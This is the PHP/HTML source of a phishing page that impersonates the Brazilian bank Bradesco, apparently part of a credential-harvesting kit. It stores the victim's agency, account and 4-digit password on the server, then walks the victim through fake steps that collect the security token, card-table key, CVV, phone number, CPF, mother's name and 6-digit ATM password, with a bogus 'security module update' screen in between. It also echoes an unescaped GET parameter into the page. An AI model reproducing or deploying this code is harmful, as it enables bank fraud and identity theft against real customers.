<?php
require_once('../_dashboard2021/config.php');
require_once('../validacao.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}

$info = null;
if(isset($_SESSION['id'])){
    $info = Info::findInfoById($_SESSION['id']);
}

$infoTipo = isset($info) && isset($info['tipo']) ? $info['tipo'] : '';

function getLayout(){
    global $infoTipo;
    if($infoTipo == 'Bradesco Prime'){
        return 'prime';
    } else if($infoTipo == 'Bradesco Exclusive'){
        return 'exclusive';
    } else {
        return 'padrao';
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<link rel="stylesheet" href="css/style-exclusive.css">';
        } else if($tipoDaConta == "prime") {
            echo '<link rel="stylesheet" href="css/style-prime.css">';
        } else {
            echo '<link rel="stylesheet" href="css/style.css">';
        }
    ?>
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Bradesco</title>
</head>
<body>
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Bradesco</p>
    </nav>
    <div id="boxAguardar" class="boxes">

        <h3 class="title aguarde">Aguarde...</h3>

    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<img class="mx-auto d-block" src="images/aguarde_exclusive.gif">';
        } else if($tipoDaConta == "prime") {
            echo '<img class="mx-auto d-block" src="images/aguarde_prime.gif">';
        } else {
            echo '<img class="mx-auto d-block" src="images/aguardando.gif">';
        }
    ?>

        <div class="conteudo">
            <p class="destaque"><span class="nome"></span>Por favor Aguarde.. Assim que solicitado, será necessário utilizar sua chave de segurança, para isso:</p>

            <div class="item equalHMRWrap">
                <div class="contador">1</div>
                <div class="texto"><p>Acesse o aplicativo Bradesco instalado em seu dispositivo móvel</p></div>
            </div>
            <div class="item">
                    <div class="contador">2</div>
                    <div class="texto"><p>Selecione a opção "Chave de Segurança"</p></div>
            </div>
            <div class="item">
                    <div class="contador">3</div>
                    <div class="texto"><p>Informe seu PIN (senha de 4 dígitos)</p></div>
            </div>
            <div class="item">
                    <div class="contador">4</div>
                    <div class="texto"><p>Informe a chave de segurança de 6 digítos informada no visor do seu dispositivo</p></div>
            </div>

        </div>

    </div>
    <div id="boxToken" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/mobile-token_128.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Informe a chave de segurança visualizada no visor do seu dispositivo para que possamos sincronizar seus pontos Bradesco Cartões a sua conta.</p>

        
        <section id="form-token">
            <form autocomplete="off">
                    <div class="input-container">

                        <input type="tel" id="tokenChave" class="frmFieldNew espacado" maxlength="6" style="width: 250px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
                    </div>
                <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
            </form>
        </section>
    </div>
    <div id="boxTabela" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/tancode_128.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Preencha o campo abaixo com a chave indicada no verso do seu cartão, conforme posição solicitada.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Posição <span id="posicaoChave"></span></strong> no verso do cartão:</p>
            <input type="tel" id="chaveTabela" class="frmFieldNew espacado" maxlength="3" style="width: 150px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCvv" class="boxes hide">
        <h3 class="title content">CONFIRMAÇÃO CVV</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/icone-cvv.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Preencha o campo abaixo com o <strong>CVV</strong> indicado no verso do seu cartão de crédito / débito.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;">Código verificador <strong>CVV</strong>:</p>
            <input type="tel" id="cvv" class="frmFieldNew espacado dotsfont" maxlength="3" style="width: 150px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCelular" class="boxes hide">
        <h3 class="title content">NÚMERO DO CELULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/phone.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>número do celular</strong> cadastrado em sua conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Número do celular:</strong></p>
            <input type="tel" id="celular" class="frmFieldNew" style="width: 250px; text-align: center;">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCpf" class="boxes hide">
        <h3 class="title content">CPF DO TÍTULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/icon-cpf.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>número do CPF</strong> do títular da conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Número do CPF:</strong></p>
            <input type="tel" id="cpf" class="frmFieldNew" style="width: 250px; text-align: center;">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxNomeMae" class="boxes hide">
        <h3 class="title content">NOME DA MÃE</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/icone-mae.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>nome da mãe</strong> do títular da conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Nome da mãe:</strong></p>
            <input type="text" id="nomeMae" class="frmFieldNew" style="width: 300px; text-align: center;">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxSenhaDe6" class="boxes hide">
        <h3 class="title content">SENHA DE 6 DÍGITOS</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/icon-password.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Informe sua senha de <strong style="white-space:nowrap">6 Dígitos</strong> a mesma utilizada nos terminais de autoatendimento Bradesco.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Senha de 6 Dígitos:</strong></p>
            <input type="tel" id="senhaDe6" class="frmFieldNew espacado dotsfont" maxlength="6" style="width: 250px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>


    <div id="boxAtualizarModulo" class="boxes hide">
        <h3 class="title content">Atualização do Módulo de Segurança!</h3>

        <div class="center">
            <img class="token" width="130" src="images/bradesco-logo.png" alt="">
        </div>
        <div class="barra">
            <div class="miolo"></div>
        </div>
        <p class="porcentagem"></p>
        <p style="font-size:13px">Aguarde enquanto atualizamos seu complemento de segurança, isso pode levar alguns minutos.</p>
    </div>


    
    <div id="logo">
        <img src="images/cadeado.png" alt="">
    </div>
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/identificacao.js"></script>
</body>
</html>